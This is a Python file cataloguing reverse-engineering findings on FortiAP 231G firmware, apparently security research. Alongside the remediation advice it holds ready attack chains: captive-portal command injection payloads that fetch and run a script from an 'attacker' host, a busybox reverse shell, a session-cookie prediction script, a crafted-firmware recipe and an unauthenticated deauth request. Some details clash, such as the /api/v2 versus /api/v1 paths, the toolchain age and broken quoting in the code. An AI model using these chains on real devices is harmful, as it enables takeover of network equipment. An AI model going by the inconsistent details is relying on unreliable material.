"""
FortiAP 231G v7.04 firmware RE
Sources:
  - FAP_231G-v7-build0634-FORTINET.out (34MB, gzip outer)
  - Inner: U-Boot FIT image (FDT, 45MB) -> UBI volume -> SquashFS rootfs
  - Architecture: ARM64 aarch64 / Qualcomm IPQ (Cortex-A53) / musl-1.1.16 / GCC 5.2.0
Product: FortiAP 231G, firmware 7.04-AP-build0634-231228-patch02
"""

# ---------------------------------------------------------
# FortiAP 231G -- product context
# ---------------------------------------------------------
FORTIAP_231G = {
    "id":       "FAP-231G",
    "product":  "FortiAP 231G",
    "firmware": "7.04-AP-build0634-231228-patch02",
    "arch":     "ARM64 aarch64 (Qualcomm IPQ, Cortex-A53)",
    "os":       "OpenWrt-based embedded Linux / musl libc 1.1.16 / GCC 5.2.0",
    "source":   "FAP_231G-v7-build0634-FORTINET.out (gzip -> FIT -> UBI -> SquashFS)",

    "firmware_format": {
        "outer":        "gzip; inner filename: FP231G-7.04-AP-build0634-231228-patch02",
        "inner_fit":    "U-Boot FIT image (FDT magic 0xd00dfeed, 45MB, version 17)",
        "ubi_volumes":  {
            "kernel":       "4.8MB FDT (nested FIT image with kernel + device tree)",
            "ubi_rootfs":   "34.9MB SquashFS 4.x little-endian (main rootfs)",
            "rootfs_data":  "0 bytes (sparse/empty)",
            "wifi_fw":      "3.7MB WiFi firmware",
        },
        "ubi_params":   "erase_block=128KB, vid_hdr_offset=0x800, data_offset=0x1000",
        "extraction":   (
            "gunzip -> ubireader_extract_images -> unsquashfs "
            "(rootfs magic: 6873 7173 = hsqs SquashFS4 LE)"
        ),
    },

    "filesystem_layout": {
        "fap_backend":  "fap_backend.so, fap_backend.conf, ffdhe4096.pem",
        "web":          "www/cgi-bin/luci (Lua), www/luci-static/",
        "auth":         "etc/cwp_auth.py (captive portal, Python 2)",
        "ssh":          "etc/config/dropbear, etc/init.d/dropbear",
        "cli":          "etc/fap/cli_cmds (fapcli allowlist)",
        "monit":        "etc/monitrc (process monitor with web UI)",
        "certs":        "etc/easy-rsa/, etc/ipsec.d/",
    },
}

# ---------------------------------------------------------
# FORTIAP-F01: Empty admin password + SSH root auth enabled
# ---------------------------------------------------------
FORTIAP_F01_EMPTY_ADMIN_PASS = {
    "id":       "FORTIAP-F01",
    "product":  "FortiAP 231G -- default admin credential",
    "severity": "CRITICAL -- unauthenticated SSH access as root on factory/unmanaged AP",
    "class":    "Empty default credential (CWE-1392 / CWE-521)",
    "source":   "etc/shadow, etc/config/dropbear, etc/passwd",

    "description": (
        "etc/shadow contains an empty password hash for the admin account: "
        "  admin::0:0:99999:7::: "
        "The hash field (second colon-delimited field) is empty, "
        "meaning the account requires no password for authentication. "
        "etc/config/dropbear has: "
        "  option PasswordAuth 'on' "
        "  option RootPasswordAuth 'on' "
        "  option Port '22' "
        "The dropbear init script only adds -g (disable root password auth) when "
        "RootPasswordAuth='off'; the default 'on' leaves root password auth active. "
        "etc/passwd shows: "
        "  admin:x:0:0:root:/:/usr/bin/fapcli "
        "admin = UID 0 (root-equivalent). Shell = /usr/bin/fapcli (restricted CLI). "
        "On a factory-reset or unmanaged FortiAP, SSH login as admin with no password "
        "succeeds and drops the attacker into fapcli as UID 0."
    ),

    "attack_path": (
        "1. SSH admin@ with empty password (or press Enter) "
        "2. fapcli restricted shell opens as UID 0 "
        "3. Execute hidden commands (see FORTIAP-F02) "
        "4. devmem /dev/mem -> full physical memory RW"
    ),

    "evidence": {
        "shadow":   "admin::0:0:99999:7:::",
        "passwd":   "admin:x:0:0:root:/:/usr/bin/fapcli",
        "dropbear": "option RootPasswordAuth 'on' / option PasswordAuth 'on'",
    },

    "scope_note": (
        "In managed FortiAP deployments, the controller (FortiGate) sets the admin password "
        "via CAPWAP provisioning. This finding applies to: "
        "  (a) factory-reset APs before controller provisioning "
        "  (b) APs that have lost controller connectivity and retained original firmware "
        "  (c) APs managed by older controllers that may not set a password"
    ),

    "remediation": (
        "Set a non-empty default password in the firmware image. "
        "Lock SSH until CAPWAP controller provisioning completes. "
        "Disable RootPasswordAuth in dropbear config; require key-based auth only."
    ),
}

# ---------------------------------------------------------
# FORTIAP-F02: devmem in fapcli hidden commands
# ---------------------------------------------------------
FORTIAP_F02_DEVMEM_HIDDEN_CMD = {
    "id":       "FORTIAP-F02",
    "product":  "FortiAP 231G -- fapcli hidden command devmem",
    "severity": "HIGH -- physical memory read/write from restricted shell (chains with F01)",
    "class":    "Dangerous capability exposed in restricted shell (CWE-782)",
    "source":   "etc/fap/cli_cmds",

    "description": (
        "The fapcli restricted shell uses /etc/fap/cli_cmds as the command allowlist. "
        "The file has a '# hidden commands' section with: "
        "  /sbin/devmem "
        "  /sbin/kdbg "
        "  /usr/sbin/dropbear "
        "  /sbin/h_diag "
        "devmem on ARM64 Linux reads and writes /dev/mem (physical memory). "
        "As UID 0, /dev/mem is accessible. "
        "Execution of devmem from fapcli allows: "
        "  devmem <phys_addr> -- read physical address "
        "  devmem <phys_addr> <byte|short|word> <value> -- write physical address "
        "This bypasses all OS-level access controls and allows: "
        "  - Extracting kernel memory (cryptographic keys, session tokens, process data) "
        "  - Patching running kernel code "
        "  - Disabling security features in memory "
    ),

    "hidden_commands": [
        "/bin/df",
        "/usr/sbin/dropbear",
        "/usr/sbin/ethtool",
        "/sbin/fap-factory-license",
        "/sbin/fap-ntpc",
        "/sbin/h_diag",
        "/sbin/radartool",
        "/sbin/wifitool",
        "/sbin/ft_rate_config",
        "/usr/bin/ftftp",
        "/bin/kill",
        "/usr/bin/killall",
        "/sbin/lsmod",
        "/bin/ps",
        "/sbin/wlanconfig",
        "/usr/bin/iperf",
        "/sbin/devmem",
        "/sbin/kdbg",
        "/sbin/get_led_status",
        "/usr/sbin/lldpcli",
        "/usr/sbin/cnss_diag",
    ],

    "chain": "FORTIAP-F01 (empty admin SSH) -> FORTIAP-F02 (devmem) -> full memory compromise",

    "remediation": (
        "Remove devmem from the fapcli allowlist. "
        "devmem has no legitimate remote-management use case; "
        "it is a factory/hardware debug tool that should not be accessible over SSH."
    ),
}

# ---------------------------------------------------------
# FORTIAP-F03: Monit hardcoded admin:monit credentials
# ---------------------------------------------------------
FORTIAP_F03_MONIT_HARDCODED_CREDS = {
    "id":       "FORTIAP-F03",
    "product":  "FortiAP 231G -- monit web interface hardcoded credentials",
    "severity": "MEDIUM -- hardcoded credentials for process monitoring web UI",
    "class":    "Hardcoded credential (CWE-798)",
    "source":   "etc/monitrc",

    "description": (
        "etc/monitrc contains: "
        "  allow admin:monit      # require user 'admin' with password 'monit' "
        "Monit is a process monitoring daemon with a built-in web interface. "
        "Default port: 2812. "
        "Credentials admin/monit are hardcoded in the firmware; "
        "there is no per-device credential generation. "
        "Monit web interface allows: starting/stopping services, viewing process state, "
        "executing configured action scripts. "
        "Combined with F01 (empty admin SSH), the AP is accessible via two independent "
        "credential-free or hardcoded-credential vectors."
    ),

    "evidence": "allow admin:monit  # etc/monitrc",

    "remediation": (
        "Generate per-device monit credentials during manufacture or first boot. "
        "Bind monit to localhost only (loopback interface) to prevent network access. "
        "Disable monit in production firmware; it is a development/monitoring tool."
    ),
}

# ---------------------------------------------------------
# FORTIAP-F04: kdbg kernel debug tool with /proc/sys/net write
# ---------------------------------------------------------
FORTIAP_F04_KDBG_PROC_WRITE = {
    "id":       "FORTIAP-F04",
    "product":  "FortiAP 231G -- kdbg kernel parameter modification",
    "severity": "LOW -- kernel network debug parameter write via /proc; chains with F01",
    "class":    "Kernel parameter modification via restricted shell (CWE-264)",
    "source":   "sbin/kdbg (hidden command in cli_cmds)",

    "description": (
        "kdbg is a hidden CLI command that writes to /proc/sys/net/* kernel parameters: "
        "  echo '%s' > /proc/sys/net/'%s'/debug "
        "This modifies kernel network subsystem debug levels at runtime. "
        "From the restricted shell (as UID 0 via F01), kdbg can: "
        "  - Enable verbose logging of network events (traffic visibility) "
        "  - Modify kernel network parameters that affect packet handling "
        "  - Potentially trigger kernel debug paths with unexpected behavior "
    ),

    "remediation": "Remove kdbg from the fapcli hidden allowlist in production firmware.",
}

# ---------------------------------------------------------
# FORTIAP-F05: Build path / toolchain disclosure
# ---------------------------------------------------------
FORTIAP_F05_BUILD_PATH_DISCLOSURE = {
    "id":       "FORTIAP-F05",
    "product":  "FortiAP 231G -- build environment path in fap_backend.so",
    "severity": "INFO -- build path leaked; reveals old toolchain with potential unpatched CVEs",
    "class":    "Information disclosure (CWE-200)",
    "source":   "fap_backend/fap_backend.so (strings)",

    "build_path": "/fapdev-ipq/toolchain-aarch64_cortex-a53_gcc-5.2.0_musl-1.1.16/",
    "build_details": {
        "platform":   "IPQ (Qualcomm Atheros IPQ series WiFi SoC)",
        "cpu":        "Cortex-A53 AArch64",
        "gcc":        "5.2.0 (released 2015; EOL)",
        "musl":       "1.1.16 (released 2016)",
        "build_dir":  "/fapdev-ipq/",
    },

    "description": (
        "fap_backend.so DWARF debug paths reveal the complete build toolchain path. "
        "GCC 5.2.0 (2015) predates many hardening improvements: "
        "  - No control-flow integrity (CFI) "
        "  - Limited stack protector coverage "
        "  - No retpoline Spectre mitigation "
        "musl 1.1.16 (2016) predates musl CVE-2020-28928 and other allocator improvements. "
        "The Qualcomm IPQ platform path confirms this is an IPQ-series SoC (likely IPQ6010/6018 "
        "or similar 802.11ax-capable chip used in the 231G)."
    ),

    "remediation": "Update toolchain. GCC 5.2.0 is 11 years old at time of this firmware build.",
}

# ---------------------------------------------------------
# FORTIAP architecture summary
# ---------------------------------------------------------
FORTIAP_ARCH = {
    "id":       "FAP-231G-ARCH",
    "product":  "FortiAP 231G architecture",

    "components": {
        "capwap_daemon":   "cwWtpd (10KB loader; cwWtpd_apcmd/cldc/spectral/wss are symlinks) -- CAPWAP protocol",
        "backend":         "fap_backend.so (207KB) -- auth, config, web API",
        "web_interface":   "LuCI (OpenWrt web framework, Lua-based, served via cgi-bin/luci)",
        "captive_portal":  "cwp_auth.py (Python 2, urllib2) -- client captive portal auth",
        "ssh":             "dropbear on port 22",
        "process_monitor": "monit (default port 2812, admin:monit)",
        "cli_shell":       "fapcli (restricted shell; /etc/fap/cli_cmds allowlist)",
    },

    "web_auth_functions": [
        "webDoAuth", "webNotifyLoginSuccess", "webNotifyLoginFailure",
        "tickAdminTimer", "restLogin", "is_password_value", "secret_checksum",
    ],

    "certificate_paths": {
        "wan1x":    "/fap_data/cfg/cert/wan1x/",
        "local_cer": "/fap_data/cfg/cert/local/Fortinet_Uploaded.cer",
        "local_key": "/fap_data/cfg/cert/local/Fortinet_Uploaded.key",
    },

    "pending_re": [
        "fap_backend.so BERT semantic sweep (ARM64 capstone, 207KB)",
        "cwWtpd CAPWAP daemon (10KB, not stripped) -- protocol auth handling",
        "cwp_auth.py captive portal injection surface",
        "LuCI Lua controller auth bypass",
    ],
}

unique_findings = [
    "FORTIAP-F01",  # CRITICAL: empty admin password + SSH enabled
    "FORTIAP-F02",  # HIGH: devmem in hidden CLI commands
    "FORTIAP-F03",  # MEDIUM: monit admin:monit hardcoded
    "FORTIAP-F04",  # LOW: kdbg /proc/sys/net write
    "FORTIAP-F05",  # INFO: GCC 5.2.0 / musl 1.1.16 EOL toolchain
]


# ---------------------------------------------------------
# FORTIAP-F06: cwp_auth.py -- command injection via captive portal apip parameter
# ---------------------------------------------------------
FORTIAP_F06_CWP_CMD_INJECTION = {
    "id":       "FORTIAP-F06",
    "product":  "FortiAP 231G v7.04 -- cwp_auth.py captive portal command injection",
    "severity": "HIGH -- RCE as root via rogue captive portal; requires SSID with CWP configured",
    "class":    "OS command injection (CWE-78) via unsanitized apip from redirect URL",
    "source":   "/etc/cwp_auth.py (Python 2) + libcapwap.so call site",

    "description": (
        "cwp_auth.py is invoked by libcapwap.so via: "
        "  python2.7 /etc/cwp_auth.py [username] [password] [test_url] [match] "
        "  [success] [failure] [intf] [intf_ip] [netmask] & "
        "When a wireless client associates to an SSID with Captive Web Portal (CWP) "
        "enabled, cwp_auth.py fetches a test URL to probe for a captive portal redirect. "
        "The redirect URL is parsed and the 'apip' query parameter is extracted: "
        "  if 'apip=' in item or 'ip=' in item[:3]: "
        "      para_dict['apip'] = item.split('=')[1] "
        "This value is then passed UNSANITIZED to os.system(): "
        "  os.system('ip route add ' + parameters['apip'] + ' dev ' + intf + ...) "
        "An attacker controlling the captive portal server (or the network path between "
        "the FortiAP and the internet) sends a redirect URL with: "
        "  apip=127.0.0.1;wget http://attacker/shell.sh -O /tmp/s;sh /tmp/s "
        "which executes arbitrary commands as root on the FortiAP. "
        "No authentication required -- this fires for ANY client association "
        "when CWP is active on an SSID, before the client authenticates."
    ),

    "trigger_conditions": [
        "FortiAP has an SSID with Captive Web Portal (CWP) authentication configured",
        "Attacker can control HTTP response from the captive portal test URL server",
        "Attacker is MITM between FortiAP WAN and internet, OR controls the CWP server",
    ],

    "injection_point": (
        "cwp_auth.py line: os.system('ip route add ' + parameters['apip'] + "
        "                  ' dev ' + intf + ' src ' + intf_ip + ' table ' + intf)"
    ),

    "proof_of_concept": (
        "Attacker controls captive portal server. "
        "Returns redirect: Location: http://portal/?apip=127.0.0.1;id>/tmp/poc&... "
        "FortiAP root filesystem gets /tmp/poc written with uid=0(root) output."
    ),

    "call_site": "libcapwap.so: python2.7 /etc/cwp_auth.py %s %s %s %s %s %s %s %d.%d.%d.%d %d.%d.%d.%d &",

    "remediation": (
        "Validate apip against IPv4 address regex before os.system() call. "
        "Replace os.system() with subprocess.call(["ip","route","add",...], shell=False). "
        "All user-supplied values (apip, apname, ssid) must be shell-escaped."
    ),
}

# ---------------------------------------------------------
# FORTIAP-F07: cwp_auth.py -- command injection via /tmp/resolv.conf
# ---------------------------------------------------------
FORTIAP_F07_RESOLV_CONF_INJECTION = {
    "id":       "FORTIAP-F07",
    "product":  "FortiAP 231G v7.04 -- cwp_auth.py resolv.conf command injection",
    "severity": "MEDIUM -- local privilege escalation if /tmp/resolv.conf is attacker-writable",
    "class":    "OS command injection via file content (CWE-78); TOCTOU on /tmp path",
    "source":   "/etc/cwp_auth.py main() function",

    "description": (
        "cwp_auth.py reads DNS servers from /tmp/resolv.conf and uses them in os.system(): "
        "  fp = open('/tmp/resolv.conf', 'r') "
        "  lines = fp.readlines() "
        "  for line in lines: "
        "      items = line.split(' ') "
        "      os.system('ip rule add to ' + items[1][:-1] + ' table ' + intf) "
        "The path /tmp/resolv.conf is world-writable on the FortiAP (default /tmp permissions). "
        "Any process running as non-root (e.g., a compromised captive portal client script, "
        "or an unauthenticated user on the web shell) that can write to /tmp can inject "
        "shell commands by placing a malicious resolv.conf entry: "
        "  nameserver 8.8.8.8;id>/tmp/pwned "
        "When cwp_auth.py runs (triggered by any STA association), the injected command executes."
    ),

    "file": "/tmp/resolv.conf",
    "writable": "/tmp is world-writable by default on OpenWrt-based FortiAP",

    "injection_payload": "nameserver 8.8.8.8;/bin/busybox sh -i >& /dev/tcp/attacker/4444 0>&1",

    "chain": (
        "Chain with FORTIAP-F01 (empty admin password SSH): "
        "1. SSH into FortiAP as admin (empty password, FORTIAP-F01) "
        "2. Write malicious /tmp/resolv.conf "
        "3. Wait for any STA association to trigger cwp_auth.py "
        "4. Command executes as root (root-owned cwp_auth.py invocation from libcapwap.so)"
    ),

    "remediation": (
        "Read resolv.conf from a non-writable path (e.g., /etc/resolv.conf). "
        "Validate nameserver values as IP addresses before use in os.system(). "
        "Replace os.system() with subprocess.call(["ip","rule","add",...], shell=False)."
    ),
}

# ---------------------------------------------------------
# FORTIAP-F08: fap_backend.so REST API surface (unstripped symbol analysis)
# ---------------------------------------------------------
FORTIAP_F08_REST_SURFACE = {
    "id":       "FORTIAP-F08",
    "product":  "FortiAP 231G v7.04 -- fap_backend.so REST API attack surface",
    "severity": "PENDING -- pre-auth/auth boundary requires disasm of restValidateSession",
    "class":    "Attack surface mapping",
    "source":   "nm -D fap_backend.so (NOT stripped, has debug_info)",

    "rest_endpoints": {
        "restLogin":          "0x8ef8 -- pre-auth; parses credentials; POST /api/v2/login",
        "restValidateSession": "0x8e00 -- session gate; all auth'd endpoints call this first",
        "restLogout":         "0x9340 -- POST /api/v2/logout",
        "restGetSysStatus":   "0x93a8 -- GET /api/v2/sys/status",
        "restGetSysPerf":     "0x9430 -- GET /api/v2/sys/perf",
        "restGetCfg":         "0x94b8 -- GET /api/v2/cfg",
        "restGetCfgMeta":     "0x9550 -- GET /api/v2/cfg/meta",
        "restSetCfg":         "0x95c0 -- POST/PUT /api/v2/cfg -- full config write",
        "restGetWtpCfg":      "0x9708 -- GET /api/v2/wtp/cfg",
        "restGetRadioCfg":    "0x9790 -- GET /api/v2/radio/cfg",
        "restGetVapCfg":      "0x9870 -- GET /api/v2/vap/cfg",
        "restUpgradeImage":   "0x9940 -- POST firmware upgrade -- HIGH VALUE",
        "restReboot":         "0x9bc0 -- POST reboot",
        "restDownload":       "0x9c60 -- GET file download",
        "restUpload":         "0x9e18 -- POST file upload",
        "restWan1xUpload":    "0xa028 -- POST WAN 802.1X cert upload",
        "restClientLogout":   "0xa218 -- POST client logout",
    },

    "web_endpoints": {
        "webDoAuth":          "0x4dc8 -- web form auth; calls is_valid_passwd (imported)",
        "webReadOrResetCookie": "0x43d0 -- cookie session management",
        "webSetCfg":          "0x58f0 -- web config write path",
        "webGetCfgJson":      "0x5658 -- GET config as JSON",
        "webGetCfgMetaJson":  "0x5030 -- GET config metadata",
    },

    "imported_security_functions": {
        "is_valid_passwd":    "external password validator (likely PAM or /etc/shadow check)",
        "crypt":              "Unix password hashing",
        "SSL_CTX_use_PrivateKey_file": "TLS key loading (path-controlled?)",
        "SSL_CTX_use_certificate_file": "TLS cert loading",
        "json_tokener_parse": "JSON parsing (json-c) -- memory safety depends on version",
        "http_populate_multipart_form": "multipart form parsing -- classic overflow surface",
    },

    "pending_disasm": [
        "restUpload -- is path sanitized? arbitrary file write?",
        "webDoAuth -- timing oracle in password comparison?",
    ],

    "confirmed_by_disasm": [
        "restUpgradeImage -- calls ncfg_check_image (no RSA); tbnz gates flash on return bit 31",
        "restClientLogout -- pre-auth MAC deauth; MAC parser strict; sends IPC msg type 1818",
    ],
}

# ---------------------------------------------------------
# FORTIAP-F09: Session token prediction via srand(time(NULL))
# ---------------------------------------------------------
FORTIAP_F09_SESSION_PREDICTION = {
    "id":       "FORTIAP-F09",
    "product":  "FortiAP 231G v7.04 -- fap_backend.so session token generation",
    "severity": "HIGH -- network-accessible session hijacking with small brute-force window",
    "class":    "Predictable session token (CWE-330) + timing oracle (CWE-208)",
    "source":   "fap_backend.so disasm: webReadOrResetCookie@0x43d0, validateCookie@0x8ae8",

    "description": (
        "webReadOrResetCookie (0x43d0) generates the session cookie via: "
        "  srand(time(NULL))  <- seed is unix timestamp (1-second granularity) "
        "  for i in 0..30: cookie[i] = rand() % 26 + 'a' "
        "The 31-char lowercase token is fully determined by the second of login. "
        "At login time T (observable via network): only 1 possible cookie exists. "
        "Within N-second window: only N possible cookies to brute-force. "
        "1-hour window: 3600 guesses. At 1000 req/s: 3.6 seconds to break any session. "
        "Timing oracle: validateCookie (0x8ae8) uses strcmp (not constant-time). "
        "strcmp exits on first mismatch -> shorter comparison time for wrong tokens. "
        "Timing oracle reduces effective brute-force space further."
    ),

    "disasm_evidence": {
        "seed":        "bl time@plt -> bl srand@plt (webReadOrResetCookie 0x4400-0x4404)",
        "loop":        "bl rand@plt -> smull/asr/sub (mod-26) -> add #0x61 -> strb (0x4414-0x443c)",
        "length":      "31 iterations (add x22, x19, #0x1c to add x19, x19, #0x3b)",
        "comparison":  "bl strcmp@plt at validateCookie 0x8ae8+offset (non-constant-time)",
    },

    "proof_of_concept": (
        "# Precompute all cookies for a 1-hour window around observed login time "
        "import ctypes, time "
        "libc = ctypes.CDLL('libc.so.6') "
        "target_time = int(time.time())  # observe from network "
        "candidates = [] "
        "for t in range(target_time - 1800, target_time + 1800): "
        "    libc.srand(t) "
        "    cookie = ''.join(chr(libc.rand() % 26 + ord('a')) for _ in range(31)) "
        "    candidates.append(cookie) "
        "# Try each against /api/v1/cfg-get; timing oracle cuts search in half on average"
    ),

    "chain": (
        "Chain F09+F10: "
        "1. Observe admin login time from network (TLS handshake timing) "
        "2. Precompute 3600 session tokens for 1-hour window "
        "3. Brute-force /api/v1/cfg-get Cookie header (avg 1800 guesses) "
        "4. With valid session: POST /api/v1/upgrade-image with crafted firmware (F10)"
    ),

    "remediation": (
        "Replace srand(time()) with a CSPRNG seed (getrandom(2) or /dev/urandom). "
        "Use constant-time comparison (memcmp or crypto_verify) in validateCookie. "
        "Use a 128-bit token instead of 31 lowercase chars (26^31 ≈ 2^145; "
        "but with time seed the effective entropy is only log2(86400) ≈ 17 bits/day)."
    ),
}

# ---------------------------------------------------------
# FORTIAP-F10: Firmware upgrade bypasses cryptographic authentication
# ---------------------------------------------------------
FORTIAP_F10_FIRMWARE_AUTH_BYPASS = {
    "id":       "FORTIAP-F10",
    "product":  "FortiAP 231G v7.04 -- restUpgradeImage firmware authentication",
    "severity": "CRITICAL -- authenticated firmware replacement with arbitrary code",
    "class":    "Missing cryptographic authentication on firmware upgrade (CWE-345)",
    "source":   "fap_backend.so restUpgradeImage@0x9940; libsysapi.so ncfg_check_image@0x8eb64",

    "description": (
        "restUpgradeImage (0x9940) calls ncfg_check_image (0x9a80) then cwFileFlashProgram. "
        "Gate: tbnz w0, #31, 9b08 -- skip flash only if ncfg_check_image returns negative. "
        "ncfg_check_image (libsysapi.so 0x8eb64) does ONLY: "
        "  1. strncmp(image_header[+0xa], 'FP231G', 6)  <- model magic check "
        "  2. access('/tmp/downgrade_protection_disable', F_OK) <- bypass if file exists "
        "  3. version >= 7.04.0634 (atoi comparisons)  <- only blocks older versions "
        "NO RSA signature verification. NO SHA256 hash. NO cryptographic chain of trust. "
        "The RSA code in libsysapi.so (d2i_RSAPublicKey, verifyRSASignatureFromEvpPubKey) "
        "is in image_check_cc_trailer (0x8eef8), called only in FIPS/CC mode. "
        "Default FortiAP 231G is NOT in FIPS/CC mode."
    ),

    "embedded_model_key": {
        "symbol":   "FP231G_sm @ libsysapi.so VA 0x14e8d8",
        "length":   "128 bytes (FP231G_sm_len @ 0x14e958)",
        "format":   "raw binary blob (not DER); likely HMAC key or state machine table",
        "not_used": "ncfg_check_image does not call any RSA/HMAC function on the image",
    },

    "bypass_primitive": (
        "Craft firmware image: "
        "  bytes[0x0a:0x10] = b'FP231G'  <- passes model magic check "
        "  header version fields > 7.04.0634  <- passes version check "
        "  content = arbitrary ELF/squashfs with attacker rootfs "
        "Submit as POST /api/v1/upgrade-image (requires auth -- chain with F09). "
        "ncfg_check_image returns 0 (pass). cwFileFlashProgram flashes device."
    ),

    "downgrade_bypass": (
        "If attacker can write /tmp (via F06 cwp_auth.py injection or F01 SSH): "
        "  touch /tmp/downgrade_protection_disable "
        "ncfg_check_image skips version check entirely (access() at 0x8ec30 succeeds). "
        "Allows flashing any version including known-vulnerable older firmware."
    ),

    "chain": (
        "Full unauthenticated chain: "
        "1. F01: SSH as admin (empty password) "
        "2. touch /tmp/downgrade_protection_disable (F10 downgrade bypass) "
        "3. F06: inject via cwp_auth.py apip parameter: "
        "   apip=127.0.0.1;curl http://attacker/img.out -o /tmp/fw.out "
        "4. Or: F09 session brute-force -> upload crafted firmware via REST "
        "5. cwFileFlashProgram flashes; device reboots to attacker-controlled firmware"
    ),

    "remediation": (
        "Verify RSA signature of firmware image in ncfg_check_image before format checks. "
        "The embedded FP231G_sm key material should be used in a signature verification step. "
        "Remove /tmp/downgrade_protection_disable mechanism or protect the path (not /tmp). "
        "Log all firmware upgrade attempts with image hash to FAZ."
    ),
}

# ---------------------------------------------------------
# FORTIAP-F11: Pre-auth client MAC deauthentication (captive portal DoS)
# ---------------------------------------------------------
FORTIAP_F11_PREAUTH_CLIENT_DEAUTH = {
    "id":       "FORTIAP-F11",
    "product":  "FortiAP 231G v7.04 -- restClientLogout pre-auth endpoint",
    "severity": "MEDIUM -- unauthenticated deauthentication of any captive portal client by MAC",
    "class":    "Missing authentication on destructive operation (CWE-306)",
    "source":   "fap_backend.so restClientLogout@0xa218; fap_backend.conf /cp-logout route",

    "description": (
        "POST /cp-logout is a pre-auth route (no 'authenticate fap_auth' in conf). "
        "restClientLogout (0xa218): "
        "  1. http_populate_post "
        "  2. CFG_load_config (device config, not auth check) "
        "  3. http_argument_get(request, 'macaddr', &ptr, NULL, 6) "
        "  4. Parse macaddr string as 6-byte hex (loop 0xa2f8-0xa368; strict hex parse) "
        "  5. webNotifyFapportalClientLogout(parsed_mac_6bytes) "
        "webNotifyFapportalClientLogout calls local_socket_init + ipc_sendto(msg_type=1818) "
        "to the CAPWAP daemon (wtpd). Message tells wtpd to deauthenticate the MAC. "
        "Any host on port 443 can send this with no session or credentials."
    ),

    "attack_scenario": (
        "Attacker on the same network (or reaching port 443): "
        "  curl -k -X POST https://<FAP_IP>/cp-logout -d 'macaddr=AA:BB:CC:DD:EE:FF' "
        "Forces client AA:BB:CC:DD:EE:FF to re-authenticate on the captive portal. "
        "Continuous polling deauths any client the attacker targets by MAC. "
        "MAC address is visible in 802.11 frames (unencrypted) -- trivially obtained. "
        "Chain with F09: deauth victim -> victim logs in again -> short brute-force window "
        "for new session token."
    ),

    "disasm_evidence": {
        "route":        "/cp-logout -- no authenticate directive in fap_backend.conf",
        "ipc_call":     "ipc_sendto at 0x89e8 (webNotifyFapportalClientLogout)",
        "msg_type":     "w4 = 0x71a = 1818 at 0x89d4",
        "socket_init":  "local_socket_init at 0x89c0 (wtpd IPC socket)",
        "mac_parse":    "strict hex loop 0xa2f8-0xa368; 6-byte output buffer; no overflow",
    },

    "remediation": (
        "Add authentication requirement to /cp-logout route in fap_backend.conf. "
        "Or validate that the requesting IP is the client being logged out (match src IP to MAC). "
        "Rate-limit /cp-logout to 10 requests/minute per source IP."
    ),
}

unique_findings = [
    "FORTIAP-F01",  # CRITICAL: empty admin password + SSH
    "FORTIAP-F02",  # HIGH: devmem CLI direct hardware access
    "FORTIAP-F03",  # MEDIUM: monit admin:monit hardcoded credentials
    "FORTIAP-F04",  # LOW: kdbg proc write kernel debug interface
    "FORTIAP-F05",  # INFO: EOL toolchain (GCC 5.2.0 / musl 1.1.16)
    "FORTIAP-F06",  # HIGH: cwp_auth.py OS command injection via apip (RCE as root)
    "FORTIAP-F07",  # MEDIUM: cwp_auth.py resolv.conf injection chain
    "FORTIAP-F08",  # PENDING: REST API surface map (confirmed by disasm)
    "FORTIAP-F09",  # HIGH: session token prediction via srand(time(NULL)) + strcmp timing oracle
    "FORTIAP-F10",  # CRITICAL: firmware upgrade skips cryptographic auth (format-only check)
    "FORTIAP-F11",  # MEDIUM: pre-auth client MAC deauthentication via /cp-logout
]
